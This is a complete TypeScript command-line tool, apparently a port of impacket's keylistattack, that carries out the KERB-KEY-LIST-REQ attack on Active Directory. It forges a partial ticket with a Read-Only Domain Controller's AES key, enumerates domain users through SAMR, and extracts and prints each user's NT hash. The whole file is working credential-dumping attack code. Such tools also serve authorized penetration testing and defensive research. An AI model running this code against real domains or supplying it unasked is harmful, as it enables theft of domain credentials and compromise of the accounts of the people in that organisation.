#!/usr/bin/env node
/**
 * jspacket - keylistattack
 *
 * Performs the KERB-KEY-LIST-REQ attack to dump secrets from a remote
 * machine without executing any agent there.
 *
 * If SMB credentials are supplied, the script enumerates the domain users
 * via SAMR. Otherwise the attack is executed against the specified targets
 * (LIST mode).
 *
 * Python implementation by Leandro Cuozzo (@0xdeaddood).
 * TypeScript port.
 */

import { Buffer } from 'node:buffer';
import { randomInt } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { createInterface } from 'node:readline';
import { parseArgs } from 'node:util';

import {
  parseTarget,
  init as initLogger,
  initProxy,
  info,
  error as logError,
  debug as logDebug,
  warning,
  critical,
  getLevel,
  LogLevel,
  normalizeArgs,
  BANNER,
} from '@impacket/examples';

import { Asn1, Constants, Crypto, KerberosV5 } from '@impacket/krb5';

import {
  type AnyValue,
  type Asn1Node,
  type Asn1Sequence,
  Asn1SequenceOf,
  parseTLV,
  TagClass,
} from '@impacket/asn1';

import {
  DCERPCTransportFactory,
  MSRPC_UUID_SAMR,
  MSRPC_UUID_WKST,
  MAXIMUM_ALLOWED,
  hSamrConnect,
  hSamrLookupDomainInSamServer,
  hSamrOpenDomain,
  hSamrEnumerateUsersInDomain,
  hSamrEnumerateGroupsInDomain,
  hSamrEnumerateAliasesInDomain,
  hSamrOpenGroup,
  hSamrOpenAlias,
  hSamrGetMembersInGroup,
  hSamrGetMembersInAlias,
  hNetrWkstaGetInfo,
  USER_NORMAL_ACCOUNT,
  USER_WORKSTATION_TRUST_ACCOUNT,
  USER_SERVER_TRUST_ACCOUNT,
  USER_INTERDOMAIN_TRUST_ACCOUNT,
} from '@impacket/dcerpc';

import { SMBConnection } from '@impacket/smb-connection';

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

const ASCII_LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';

/** Generate a random session key made of ascii letters, matching impacket. */
function randomSessionKey(length: number): Buffer {
  let s = '';
  for (let i = 0; i < length; i++) {
    s += ASCII_LETTERS[randomInt(ASCII_LETTERS.length)];
  }
  return Buffer.from(s, 'ascii');
}

function buildPrincipalName(type: number, components: string[]): Asn1Sequence {
  return Asn1.principalToAsn1({ type, components });
}

/** Strip a single trailing NUL byte, mirroring impacket's `[:-1]`. */
function stripNull(s: string): string {
  return s.endsWith('\x00') ? s.slice(0, -1) : s;
}

/**
 * If the KDC replied with a KRB-ERROR (APPLICATION tag 30), decode it and
 * throw a KerberosError so the caller can classify by message.
 */
function raiseIfKrbError(resp: Buffer): void {
  const tlv = parseTLV(resp);
  if (tlv.cls === TagClass.APPLICATION && tlv.tag === 30) {
    const krbErr = Asn1.KRB_ERROR();
    krbErr.decode(resp);
    throw new KerberosV5.KerberosError({ packet: krbErr.values });
  }
}

// ---------------------------------------------------------------------------
// RemoteOperations (SAMR / wkssvc over the established SMB connection)
// ---------------------------------------------------------------------------

class RemoteOperations {
  private smbConnection: InstanceType<typeof SMBConnection>;
  private samr: any = null;
  private domainHandle: any = null;

  constructor(smbConnection: InstanceType<typeof SMBConnection>) {
    this.smbConnection = smbConnection;
  }

  async connectSamr(domain: string): Promise<void> {
    const rpc = DCERPCTransportFactory('ncacn_np:445[\\pipe\\samr]');
    if ('setSmbConnection' in rpc) {
      (rpc as unknown as { setSmbConnection: (c: unknown) => void }).setSmbConnection(
        this.smbConnection,
      );
    }
    this.samr = rpc.getDceRpc();
    await this.samr.connect();
    await this.samr.bind(MSRPC_UUID_SAMR);

    const resp = await hSamrConnect(this.samr);
    const serverHandle = resp.get('ServerHandle') as any;

    const lookup = await hSamrLookupDomainInSamServer(this.samr, serverHandle, domain);
    const open = await hSamrOpenDomain(
      this.samr,
      serverHandle,
      MAXIMUM_ALLOWED,
      lookup.get('DomainId'),
    );
    this.domainHandle = open.get('DomainHandle');
  }

  async getMachineNameAndDomain(): Promise<[string, string]> {
    if (this.smbConnection.getServerName() === '') {
      const rpc = DCERPCTransportFactory('ncacn_np:445[\\pipe\\wkssvc]');
      if ('setSmbConnection' in rpc) {
        (rpc as unknown as { setSmbConnection: (c: unknown) => void }).setSmbConnection(
          this.smbConnection,
        );
      }
      const dce = rpc.getDceRpc();
      await dce.connect();
      await dce.bind(MSRPC_UUID_WKST);
      const resp = await hNetrWkstaGetInfo(dce, 100);
      await dce.disconnect();
      const info100: any = (resp.get('WkstaInfo') as any).get('WkstaInfo100');
      return [
        stripNull(String(info100.get('wki100_computername'))),
        stripNull(String(info100.get('wki100_langroup'))),
      ];
    }
    return [this.smbConnection.getServerName(), this.smbConnection.getServerDomain()];
  }

  getDNSDomain(): string {
    const dns = this.smbConnection.getServerDNSDomainName();
    return dns === '' ? '' : dns;
  }

  async getDomainUsers(): Promise<{ name: string; rid: number }[]> {
    const resp = await hSamrEnumerateUsersInDomain(
      this.samr,
      this.domainHandle,
      USER_NORMAL_ACCOUNT |
        USER_WORKSTATION_TRUST_ACCOUNT |
        USER_SERVER_TRUST_ACCOUNT |
        USER_INTERDOMAIN_TRUST_ACCOUNT,
      0,
    );
    return this.parseRidEnumeration(resp);
  }

  async getGroupsInDomain(): Promise<number[]> {
    let resp: any;
    try {
      resp = await hSamrEnumerateGroupsInDomain(this.samr, this.domainHandle);
    } catch (e: any) {
      if (e && e.packet) resp = e.packet;
      else throw e;
    }
    return this.parseRidEnumeration(resp).map((u) => u.rid);
  }

  async getAliasesInDomain(): Promise<number[]> {
    let resp: any;
    try {
      resp = await hSamrEnumerateAliasesInDomain(this.samr, this.domainHandle);
    } catch (e: any) {
      if (e && e.packet) resp = e.packet;
      else throw e;
    }
    return this.parseRidEnumeration(resp).map((u) => u.rid);
  }

  async getMembersInGroup(rid: number): Promise<number[]> {
    const ans = await hSamrOpenGroup(this.samr, this.domainHandle, MAXIMUM_ALLOWED, rid);
    const resp = await hSamrGetMembersInGroup(this.samr, ans.get('GroupHandle') as any);
    const buffer: any = resp.get('Members');
    const members = buffer.get('Members') as unknown[];
    return (members ?? []).map((m: any) => (typeof m === 'number' ? m : Number(m.get('Data'))));
  }

  async getMembersInAlias(rid: number): Promise<number[]> {
    const ans = await hSamrOpenAlias(this.samr, this.domainHandle, MAXIMUM_ALLOWED, rid);
    const resp = await hSamrGetMembersInAlias(this.samr, ans.get('AliasHandle') as any);
    const members: any = resp.get('Members');
    const sids = (members.get('Sids') as unknown[]) ?? [];
    const rids: number[] = [];
    for (const sidItem of sids as any[]) {
      // Array element is a PSAMPR_SID_INFORMATION pointer: deref Data → SidPointer (RPC_SID).
      const rpcSid: any = (sidItem.get('Data') as any).get('SidPointer');
      const subAuth = rpcSid.get('SubAuthority') as number[];
      if (subAuth && subAuth.length > 0) {
        rids.push(subAuth[subAuth.length - 1]!);
      }
    }
    return rids;
  }

  private parseRidEnumeration(resp: any): { name: string; rid: number }[] {
    const out: { name: string; rid: number }[] = [];
    const buffer: any = resp.get('Buffer');
    const entries = (buffer.get('Buffer') as unknown[]) ?? [];
    for (const entry of entries as any[]) {
      out.push({ name: String(entry.get('Name')), rid: Number(entry.get('RelativeId')) });
    }
    return out;
  }
}

// ---------------------------------------------------------------------------
// KeyListSecrets - the KERB-KEY-LIST-REQ attack
// ---------------------------------------------------------------------------

const AES256 = Constants.EncryptionTypes.aes256_cts_hmac_sha1_96;

class KeyListSecrets {
  private domain: string;
  private kdcHostName: string;
  private keyVersionNumber: number;
  private rodcKey: string;
  private remoteOps: RemoteOperations | null;

  constructor(
    domainName: string,
    kdc: string,
    kvno: number,
    rodcKey: string,
    remoteOps: RemoteOperations | null,
  ) {
    this.remoteOps = remoteOps;
    this.keyVersionNumber = kvno;
    this.rodcKey = rodcKey;
    this.domain = domainName;
    this.kdcHostName = kdc;
  }

  /** Resolve domain/kdc from the RemoteOperations when running the SMB path. */
  async resolveFromRemoteOps(): Promise<void> {
    if (this.remoteOps === null) return;
    this.kdcHostName = (await this.remoteOps.getMachineNameAndDomain())[0];
    this.domain = this.remoteOps.getDNSDomain();
  }

  getDomain(): string {
    return this.domain;
  }

  /**
   * Build a partial (empty) TGT encrypted with the RODC's AES key.
   * Returns the Ticket ASN.1 node and the random session key.
   */
  createPartialTGT(user: string): { partialTGT: Asn1Sequence; sessionKey: Buffer } {
    // Encrypted ticket part -----------------------------------------------
    const encTicketPart = Asn1.EncTicketPart();
    // Flags: forwardable, renewable, enc-pa-rep
    Asn1.seqSetFlags(encTicketPart, 'flags', [
      Constants.TicketFlags.forwardable,
      Constants.TicketFlags.renewable,
      Constants.TicketFlags.enc_pa_rep,
    ]);

    const sessionKey = randomSessionKey(32);
    const encKey = Asn1.EncryptionKey();
    encKey.set('keytype', AES256);
    encKey.set('keyvalue', sessionKey);
    encTicketPart.set('key', encKey);

    encTicketPart.set('crealm', this.domain);
    encTicketPart.set('cname', buildPrincipalName(Constants.PrincipalNameType.NT_PRINCIPAL, [user]));

    const transited = Asn1.TransitedEncoding();
    transited.set('tr-type', 0);
    transited.set('contents', Buffer.alloc(0));
    encTicketPart.set('transited', transited);

    const now = new Date();
    encTicketPart.set('authtime', now);
    encTicketPart.set('starttime', now);
    const till = new Date(Date.now() + 120 * 24 * 3600 * 1000);
    encTicketPart.set('endtime', till);
    encTicketPart.set('renew-till', till);
    // No authorization-data (no PAC)

    const encoded = encTicketPart.encode();

    // Encrypt with the RODC key, key usage 2 (KEY_USAGE_AS_REP_TGS_REP-ish
    // "key tgt service")
    const cipher = Crypto._get_enctype_profile(AES256);
    const key = new Crypto.Key(AES256, Buffer.from(this.rodcKey, 'hex'));
    const cipherText = cipher.encrypt(key, 2, encoded, null);

    // Ticket wrapper -------------------------------------------------------
    const partialTGT = Asn1.Ticket();
    partialTGT.set('tkt-vno', Constants.ProtocolVersionNumber.pvno);
    partialTGT.set('realm', this.domain);
    partialTGT.set(
      'sname',
      buildPrincipalName(Constants.PrincipalNameType.NT_SRV_INST, ['krbtgt', this.domain]),
    );
    const encData = Asn1.EncryptedData();
    encData.set('etype', AES256);
    encData.set('kvno', this.keyVersionNumber << 16);
    encData.set('cipher', cipherText);
    partialTGT.set('enc-part', encData);

    return { partialTGT, sessionKey };
  }

  /**
   * Send a TGS-REQ carrying an AP-REQ built from the partial TGT plus a
   * KERB-KEY-LIST-REQ padata. The KDC replies with the FULL TGT including
   * the requested keys.
   */
  async getFullTGT(
    user: string,
    partialTGT: Asn1Sequence,
    sessionKey: Buffer,
  ): Promise<Buffer | null> {
    const cipher = Crypto._get_enctype_profile(AES256);

    // AP-REQ authenticator -------------------------------------------------
    const authenticator = Asn1.Authenticator();
    authenticator.set('authenticator-vno', 5);
    authenticator.set('crealm', this.domain);
    authenticator.set('cname', buildPrincipalName(Constants.PrincipalNameType.NT_PRINCIPAL, [user]));
    const now = new Date();
    authenticator.set('cusec', now.getUTCMilliseconds() * 1000);
    authenticator.set('ctime', now);
    const encodedAuthenticator = authenticator.encode();
    const keyAuth = new Crypto.Key(AES256, sessionKey);
    const encryptedAuthenticator = cipher.encrypt(keyAuth, 7, encodedAuthenticator, null);

    // AP-REQ ---------------------------------------------------------------
    const apReq = Asn1.AP_REQ();
    apReq.set('pvno', 5);
    apReq.set('msg-type', Constants.ApplicationTagNumbers.AP_REQ);
    Asn1.seqSetFlags(apReq, 'ap-options', []);
    apReq.set('ticket', partialTGT);
    const apReqEnc = Asn1.EncryptedData();
    apReqEnc.set('etype', AES256);
    apReqEnc.set('cipher', encryptedAuthenticator);
    apReq.set('authenticator', apReqEnc);
    const encodedApReq = apReq.encode();

    // TGS-REQ --------------------------------------------------------------
    const tgsReq = Asn1.TGS_REQ();
    tgsReq.set('pvno', 5);
    tgsReq.set('msg-type', Constants.ApplicationTagNumbers.TGS_REQ);

    const padataSeq = new Asn1SequenceOf(Asn1.PA_DATA());
    const pa0 = Asn1.PA_DATA();
    pa0.set('padata-type', Constants.PreAuthenticationDataTypes.PA_TGS_REQ);
    pa0.set('padata-value', encodedApReq);
    padataSeq.add(pa0);

    const keyListReq = Asn1.KERB_KEY_LIST_REQ();
    keyListReq.add(new Asn1.Int32(Constants.EncryptionTypes.rc4_hmac));
    const pa1 = Asn1.PA_DATA();
    pa1.set('padata-type', Constants.PreAuthenticationDataTypes.KERB_KEY_LIST_REQ);
    pa1.set('padata-value', keyListReq.encode());
    padataSeq.add(pa1);
    tgsReq.set('padata', padataSeq);

    const reqBody = Asn1.KDC_REQ_BODY();
    Asn1.seqSetFlags(reqBody, 'kdc-options', [Constants.KDCOptions.canonicalize]);
    reqBody.set(
      'sname',
      buildPrincipalName(Constants.PrincipalNameType.NT_SRV_INST, ['krbtgt', this.domain]),
    );
    reqBody.set('realm', this.domain);
    reqBody.set('till', new Date(Date.now() + 24 * 3600 * 1000));
    reqBody.set('nonce', randomInt(0x7fffffff));

    const etypeSeq = new Asn1SequenceOf(new Asn1.Int32());
    for (const e of [
      AES256,
      Constants.EncryptionTypes.aes128_cts_hmac_sha1_96,
      Constants.EncryptionTypes.rc4_hmac,
      Constants.EncryptionTypes.rc4_hmac_exp,
      Constants.EncryptionTypes.rc4_hmac_old_exp,
    ]) {
      etypeSeq.add(new Asn1.Int32(e));
    }
    reqBody.set('etype', etypeSeq);
    tgsReq.set('req-body', reqBody);

    const message = tgsReq.encode();

    try {
      logDebug(`Requesting a service ticket for the user ${user}`);
      const resp = await KerberosV5.sendReceive(message, this.domain, this.kdcHostName);
      raiseIfKrbError(resp);
      return resp;
    } catch (e) {
      const msg = String((e as Error).message ?? e);
      if (msg.includes('KDC_ERR_TGT_REVOKED') || msg.includes('KDC_ERR_CLIENT_REVOKED')) {
        logError(`User ${user} is not allowed to have passwords replicated in RODCs`);
      } else if (msg.includes('KDC_ERR_C_PRINCIPAL_UNKNOWN')) {
        logError(`User ${user} doesn't exist`);
      } else if (msg.includes('KDC_ERR_KEY_EXPIRED')) {
        logError(`User ${user}'s password has expired`);
      } else if (msg.includes('Connection timed out')) {
        throw new Error('Connection timed out: check the KDC HostName or IP address, aborting');
      } else if (msg.includes('Name or service not known')) {
        throw new Error('Name or service not known: check the KDC HostName or IP address, aborting');
      } else if (msg.includes('KDC_ERR_WRONG_REALM')) {
        throw new Error("KDC_ERR_WRONG_REALM: domain doesn't exist, aborting");
      } else if (msg.includes('KDC_ERR_S_PRINCIPAL_UNKNOWN')) {
        throw new Error(
          'KDC_ERR_S_PRINCIPAL_UNKNOWN: check the RODC krbtgt account number, aborting',
        );
      } else if (msg.includes('KRB_AP_ERR_BAD_INTEGRITY')) {
        throw new Error('KRB_AP_ERR_BAD_INTEGRITY: check the RODC AES key, aborting');
      } else {
        logError(msg);
      }
      return null;
    }
  }

  /** Decrypt the TGS-REP and extract the requested key from KERB-KEY-LIST-REP. */
  getKey(resp: Buffer, sessionKey: Buffer): string {
    const tgsRep = Asn1.TGS_REP();
    tgsRep.decode(resp);

    const encPart = tgsRep.get('enc-part') as Record<string, AnyValue>;
    const enctype = Number(encPart['etype']);
    const cipher = Crypto._get_enctype_profile(enctype);
    const keyAuth = new Crypto.Key(enctype, sessionKey);
    const decrypted = cipher.decrypt(keyAuth, 8, encPart['cipher'] as Buffer);

    const encTGSRepPart = Asn1.EncTGSRepPart();
    encTGSRepPart.decode(decrypted);
    const encPaData = encTGSRepPart.get('encrypted_pa_data') as unknown as Asn1Node[];
    const encPaData1 = encPaData[0] as Asn1Sequence;
    const padataValue = encPaData1.get('padata-value') as Buffer;

    const rep = Asn1.KERB_KEY_LIST_REP();
    rep.decode(padataValue);
    const keyNode = (rep as unknown as { items: Asn1Node[] }).items[0] as Asn1Sequence;
    const keyvalue = keyNode.get('keyvalue') as Buffer;

    // Mirror pyasn1 prettyPrint() -> "0x<hex>"
    return '0x' + keyvalue.toString('hex');
  }

  async getAllowedUsersToReplicate(): Promise<string[]> {
    const ops = this.remoteOps!;
    const groupsList = await ops.getGroupsInDomain();
    const aliasesList = await ops.getAliasesInDomain();

    // Denied Password Replication alias (RID 572), plus the well-known
    // accounts denied by default.
    const deniedList: number[] = [500, 501, 502, 503];
    for (const rid of await ops.getMembersInAlias(572)) {
      if (!deniedList.includes(rid)) deniedList.push(rid);
    }

    // Expand nested groups/aliases (index-based loop, since deniedList grows).
    for (let i = 0; i < deniedList.length; i++) {
      const rid = deniedList[i]!;
      if (groupsList.includes(rid)) {
        for (const rid2 of await ops.getMembersInGroup(rid)) {
          if (!deniedList.includes(rid2)) deniedList.push(rid2);
        }
      } else if (aliasesList.includes(rid)) {
        for (const rid2 of await ops.getMembersInAlias(rid)) {
          if (!deniedList.includes(rid2)) deniedList.push(rid2);
        }
      }
    }

    const targetList: string[] = [];
    for (const user of await ops.getDomainUsers()) {
      if (!deniedList.includes(user.rid) && !user.name.includes('krbtgt_')) {
        targetList.push(`${user.name}:${user.rid}`);
      }
    }
    return targetList;
  }
}

// ---------------------------------------------------------------------------
// KeyListDump - orchestration
// ---------------------------------------------------------------------------

interface KeyListOptions {
  aesKey: string;
  doKerberos: boolean;
  rodcKey: string;
  targetIp: string | null;
  kdcHost: string | null;
  rodcNo: number;
  full: boolean;
  hashes: string | null;
}

class KeyListDump {
  private domain: string;
  private username: string;
  private password: string;
  private aesKey: string;
  private doKerberos: boolean;
  private rodcKey: string;
  private remoteName: string;
  private remoteHost: string | null;
  private kdcHost: string | null;
  private rodc: number;
  private enum: boolean;
  private targets: string[];
  private full: boolean;
  private lmhash = '';
  private nthash = '';

  private smbConnection: InstanceType<typeof SMBConnection> | null = null;
  private remoteOps: RemoteOperations | null = null;

  constructor(
    remoteName: string,
    username: string,
    password: string,
    domain: string,
    options: KeyListOptions,
    enumerate: boolean,
    targets: string[],
  ) {
    this.domain = domain;
    this.username = username;
    this.password = password;
    this.aesKey = options.aesKey;
    this.doKerberos = options.doKerberos;
    this.rodcKey = options.rodcKey;
    this.remoteName = remoteName;
    this.remoteHost = options.targetIp;
    this.kdcHost = options.kdcHost;
    this.rodc = options.rodcNo;
    this.enum = enumerate;
    this.targets = targets;
    this.full = options.full;

    if (options.hashes != null) {
      const parts = options.hashes.split(':');
      this.lmhash = parts[0] ?? '';
      this.nthash = parts[1] ?? '';
    }
  }

  private async connect(): Promise<void> {
    try {
      this.smbConnection = new SMBConnection(
        this.remoteName,
        this.remoteHost ?? this.remoteName,
      );
      await this.smbConnection.negotiateSession();
      if (this.doKerberos) {
        await this.smbConnection.kerberosLogin(
          this.username,
          this.password,
          this.domain,
          this.lmhash,
          this.nthash,
          this.aesKey,
          this.kdcHost,
        );
      } else {
        await this.smbConnection.login(
          this.username,
          this.password,
          this.domain,
          this.lmhash,
          this.nthash,
        );
      }
    } catch (e) {
      if (process.env.KRB5CCNAME !== undefined && this.doKerberos === true) {
        logDebug(`SMBConnection didn't work, hoping Kerberos will help (${String(e)})`);
      } else {
        throw e;
      }
    }
  }

  async run(): Promise<void> {
    let keyListSecrets: KeyListSecrets;
    let targetList: string[];

    if (this.enum === true) {
      await this.connect();
      this.remoteOps = new RemoteOperations(this.smbConnection!);
      await this.remoteOps.connectSamr(this.domain);
      keyListSecrets = new KeyListSecrets(
        this.domain,
        this.remoteName,
        this.rodc,
        this.rodcKey,
        this.remoteOps,
      );
      await keyListSecrets.resolveFromRemoteOps();
      info('Enumerating target users. This may take a while on large domains');
      if (this.full === true) {
        targetList = await this.getAllDomainUsers();
      } else {
        targetList = await keyListSecrets.getAllowedUsersToReplicate();
      }
    } else {
      info('Using target users provided by parameter');
      keyListSecrets = new KeyListSecrets(
        this.domain,
        this.remoteName,
        this.rodc,
        this.rodcKey,
        null,
      );
      targetList = this.targets;
    }

    const domain = keyListSecrets.getDomain();
    info('Dumping Domain Credentials (domain\\uid:[rid]:nthash)');
    info('Using the KERB-KEY-LIST request method. Tickets everywhere!');
    for (const targetUser of targetList) {
      const user = targetUser.split(':')[0]!;
      const { partialTGT, sessionKey } = keyListSecrets.createPartialTGT(user);
      const fullTGT = await keyListSecrets.getFullTGT(user, partialTGT, sessionKey);
      if (fullTGT !== null) {
        const key = keyListSecrets.getKey(fullTGT, sessionKey);
        console.log(domain + '\\' + targetUser + ':' + key.slice(2));
      }
    }
  }

  private async getAllDomainUsers(): Promise<string[]> {
    const users = await this.remoteOps!.getDomainUsers();
    // Users not allowed to replicate passwords by default
    const deniedUsers = [500, 501, 502, 503];
    const targetList: string[] = [];
    for (const user of users) {
      if (!deniedUsers.includes(user.rid) && !user.name.includes('krbtgt_')) {
        targetList.push(`${user.name}:${user.rid}`);
      }
    }
    return targetList;
  }
}

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------

function usage(): never {
  console.log(`Performs the KERB-KEY-LIST-REQ attack to dump secrets from the remote machine
without executing any agent there.

usage: keylistattack [-h] [-rodcNo RODCNO] [-rodcKey RODCKEY] [-full] [-debug]
                     [-ts] [-domain DOMAIN] [-kdc KDC] [-t T] [-tf TF]
                     [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                     [-dc-ip ip address] [-target-ip ip address]
                     target

positional arguments:
  target                [[domain/]username[:password]@]<KDC HostName or IP
                        address> (Use this credential to authenticate to SMB
                        and list domain users (low-privilege account) or LIST
                        (if you want to parse a target file)

options:
  -h, --help            show this help message and exit
  -rodcNo RODCNO        Number of the RODC krbtgt account
  -rodcKey RODCKEY      AES key of the Read Only Domain Controller
  -full                 Run the attack against all domain users. Noisy! It
                        could lead to more TGS requests being rejected
  -debug                Turn DEBUG output ON
  -ts                   Adds timestamp to every logging output

LIST option:
  -domain DOMAIN        The fully qualified domain name (only works with LIST)
  -kdc KDC              KDC HostName or FQDN (only works with LIST)
  -t T                  Attack only the username specified (only works with LIST)
  -tf TF                File that contains a list of target usernames (only
                        works with LIST)

authentication:
  -hashes LMHASH:NTHASH
                        Use NTLM hashes to authenticate to SMB and list domain
                        users.
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos to authenticate to SMB and list domain
                        users. Grabs credentials from ccache file (KRB5CCNAME)
                        based on target parameters. If valid credentials cannot
                        be found, it will use the ones specified in the command
                        line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use
                        the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will
                        use whatever was specified as target. This is useful
                        when target is the NetBIOS name and you cannot resolve it
`);
  process.exit(1);
}

async function promptPassword(): Promise<string> {
  const rl = createInterface({ input: process.stdin, output: process.stderr });
  return new Promise<string>((resolve) => {
    rl.question('Password:', (answer) => {
      rl.close();
      resolve(answer);
    });
  });
}

async function main(): Promise<void> {
  const args = normalizeArgs(process.argv.slice(2));

  if (args.length === 0) {
    usage();
  }

  console.log(BANNER + '\n');

  let values: any;
  let positionals: string[];
  try {
    ({ values, positionals } = parseArgs({
      args,
      allowPositionals: true,
      options: {
        rodcNo: { type: 'string' },
        rodcKey: { type: 'string' },
        full: { type: 'boolean', default: false },
        debug: { type: 'boolean', default: false },
        ts: { type: 'boolean', default: false },
        domain: { type: 'string' },
        kdc: { type: 'string' },
        t: { type: 'string', short: 't' },
        tf: { type: 'string' },
        hashes: { type: 'string' },
        'no-pass': { type: 'boolean', default: false },
        k: { type: 'boolean', short: 'k', default: false },
        aesKey: { type: 'string' },
        'dc-ip': { type: 'string' },
        'target-ip': { type: 'string' },
        proxy: { type: 'string' },
        help: { type: 'boolean', short: 'h', default: false },
      },
    }));
  } catch (e) {
    console.error(`[-] ${(e as Error).message}`);
    usage();
  }

  if (values.help || positionals.length < 1) {
    usage();
  }

  initLogger({ ts: values.ts, debug: values.debug });
  initProxy(values.proxy);

  if (values.rodcNo === undefined) {
    logError('You must specify the RODC number (krbtgt_XXXXX)');
    process.exit(1);
  }
  if (values.rodcKey === undefined) {
    logError('You must specify the RODC aes key');
    process.exit(1);
  }

  const targetArg = positionals[0]!;
  // eslint-disable-next-line prefer-const
  let [domain, username, password, remoteName] = parseTarget(targetArg);

  if (remoteName === '') {
    logError('You must specify a target or set the option LIST');
    process.exit(1);
  }

  let targetIp: string | null = values['target-ip'] ?? null;
  let enumerate: boolean;
  let targets: string[] = [];

  const doKerberos = values.k ?? false;

  if (remoteName === 'LIST') {
    if (values.full === true) {
      warning('Flag -full will have no effect');
    }
    if (values.t !== undefined) {
      targets.push(values.t);
    } else if (values.tf !== undefined) {
      try {
        const content = readFileSync(values.tf, 'utf-8');
        for (const line of content.split(/\r?\n/)) {
          const target = line.trim();
          if (target !== '' && target[0] !== '#') {
            targets.push(target + ':' + 'N/A');
          }
        }
      } catch (e) {
        logError(`Could not open file: ${values.tf} - ${String(e)}`);
        process.exit(1);
      }
      if (targets.length === 0) {
        logError('No valid targets specified!');
        process.exit(1);
      }
    } else {
      logError('You must specify a target username or targets file');
      process.exit(1);
    }

    if (values.kdc !== undefined) {
      if (values.kdc.includes('.')) {
        const idx = values.kdc.indexOf('.');
        remoteName = values.kdc.slice(0, idx);
        domain = values.kdc.slice(idx + 1);
      } else {
        remoteName = values.kdc;
      }
    } else {
      logError('You must specify the KDC HostName or FQDN');
      process.exit(1);
    }

    if (targetIp === null) {
      targetIp = remoteName;
    }
    if (values.domain !== undefined) {
      domain = values.domain;
    }
    if (domain === '') {
      logError(
        'You must specify a target domain. Use the flag -domain or define a FQDN in flag -kdc',
      );
      process.exit(1);
    }

    enumerate = false;
  } else {
    if (!targetArg.includes('@')) {
      logError('You must specify the KDC HostName or IP Address');
      process.exit(1);
    }
    if (targetIp === null) {
      targetIp = remoteName;
    }
    if (domain === '') {
      logError('You must specify a target domain');
      process.exit(1);
    }
    if (username === '') {
      logError('You must specify a username');
      process.exit(1);
    }
    if (
      password === '' &&
      values.hashes === undefined &&
      values['no-pass'] === false &&
      values.aesKey === undefined
    ) {
      password = await promptPassword();
    }

    enumerate = true;
  }

  const options: KeyListOptions = {
    aesKey: values.aesKey ?? '',
    doKerberos,
    rodcKey: values.rodcKey,
    targetIp,
    kdcHost: values['dc-ip'] ?? null,
    rodcNo: parseInt(values.rodcNo, 10),
    full: values.full ?? false,
    hashes: values.hashes ?? null,
  };

  try {
    const dumper = new KeyListDump(
      remoteName,
      username,
      password,
      domain,
      options,
      enumerate,
      targets,
    );
    await dumper.run();
  } catch (e) {
    if (getLevel() === LogLevel.DEBUG) {
      console.error(e);
    }
    logError(String((e as Error).message ?? e));
  }
}

main();
